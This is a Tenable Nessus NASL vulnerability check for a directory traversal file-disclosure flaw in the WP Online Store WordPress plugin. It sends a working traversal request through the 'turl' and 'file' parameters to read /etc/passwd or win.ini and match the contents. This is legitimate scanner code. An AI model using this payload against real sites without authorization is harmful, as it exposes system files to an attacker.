#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69518);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/12/12 19:19:06 $");

  script_bugtraq_id(57963);
  script_osvdb_id(90244);

  script_name(english:"WP Online Store Plugin for WordPress Multiple Parameter File Disclosure");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WP Online Store Plugin for WordPress installed on the remote host
is affected by an information disclosure vulnerability due to a
failure to properly sanitize user-supplied input to the 'turl' and
'file' parameters. An unauthenticated, remote attacker can exploit
this to view arbitrary files by forming a request containing directory
traversal sequences.

Note that the WP Online Store Plugin is also reportedly affected by a
local file inclusion vulnerability; however, Nessus has not tested for
this issue.");
  # http://ceriksen.com/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6060ed31");
  script_set_attribute(attribute:"see_also", value:"http://plugins.trac.wordpress.org/changeset/654344/wp-online-store");
  script_set_attribute(attribute:"solution", value:
"WP Online Store Plugin version 1.3.1 was re-released on 1/17/13.
Upgrade to the re-released version 1.3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/01/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "WP Online Store plugin";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "wp-online-store/editor_plugin.js"][0] =
    make_list('function wpols_plugin');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln = FALSE;

url_path = install['Redirect'];
if (!isnull(url_path)) dir = url_path;

foreach file (files)
{
  attack =  mult_str(str:"../", nb:12);
  url = "?force=downloadnow&turl=" + attack + "&file=" + file;

  res = http_send_recv3(
    method       : "GET",
    item         : dir + url,
    port         : port,
    exit_on_fail : TRUE,
    follow_redirect: 1
  );
  body = res[2];

  # Check for errors
  error_returned = FALSE;
  if (
    !isnull(body) &&
    (
      # magic_quotes_gpc
      (attack + '\\0/wp-load.php): failed to open stream:' >< body) ||
      (attack + '\\0/wp-load.php) [function.' >< body) ||
      (attack + '\\0/wp-load.php'+") [<a href='function." >< body) ||
      # open_basedir
      ("Failed opening required '" + attack >< body) ||
      ("open_basedir restriction in effect. File(" + attack >< body)
    )
  ) error_returned = TRUE;
  pat = file_pats[file];

  if ((body =~ pat) || (error_returned))
  {
    if (!isnull(url_path))
      inst_url = build_url(qs:url_path, port:port);
    attack_req = inst_url + url;
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

line_limit = 10;
if (error_returned)
{
  output = res[2];
  snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\n' + 'Nessus was not able to exploit the issue, but was able to verify it'+
    '\n' + 'exists by examining the error message returned from the following' + 
    '\n' + 'request :' +
    '\n' +
    '\n' + attack_req +
    '\n' +
    '\n' + snip +
    '\n' + beginning_of_response(resp:output, max_lines:line_limit) +
    '\n' + snip +
    '\n';
  security_warning(port:port, extra:report);
  exit(0);
}
else
{
  pos = stridx(body, "<!");
  output = substr(body, 0, pos-1);

  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : file,
    line_limit  : line_limit,
    request     : make_list(attack_req),
    output      : chomp(output),
    attach_type : 'text/plain'
  );
}
